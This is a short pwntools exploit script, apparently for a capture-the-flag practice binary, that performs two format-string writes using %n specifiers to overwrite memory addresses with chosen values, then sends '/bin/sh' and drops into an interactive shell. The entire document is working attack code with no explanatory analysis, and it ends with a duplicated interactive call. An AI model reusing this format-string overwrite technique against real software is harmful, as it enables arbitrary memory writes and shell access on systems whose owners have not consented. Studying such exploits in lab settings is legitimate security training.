from pwn import *

import time

import sys

target = process("./chall-test_fmtString-16-x86")
gdb.attach(target)

# Declare our addresses
address = 0x804b310
address0 = p32(address + 0)
address1 = p32(address + 2)

# The value we are trying to write
value = 0x8049215

# The print value size, to control the value being written
print0 = "%37386x"
print1 = "%30191x"

# Specify the offset to the address, and write to it
write0 = "%6$n"
write1 = "%7$n"

# Form the payload
payload = ""
payload = "000"
payload += address0
payload += address1
payload += print0
payload += write0
payload += print1
payload += write1

# Send the fmt string payload
target.sendline(payload)
# Declare our addresses
address = 0x804b2f0
address0 = p32(address + 0)
address1 = p32(address + 2)

# The value we are trying to write
value = 0x80490a0

# The print value size, to control the value being written
print0 = "%37013x"
print1 = "%30564x"

# Specify the offset to the address, and write to it
write0 = "%6$n"
write1 = "%7$n"

# Form the payload
payload = ""
payload = "000"
payload += address0
payload += address1
payload += print0
payload += write0
payload += print1
payload += write1

# Send the fmt string payload
target.sendline(payload)

target.sendline("/bin/sh\x00")


target.interactive()


target.interactive()
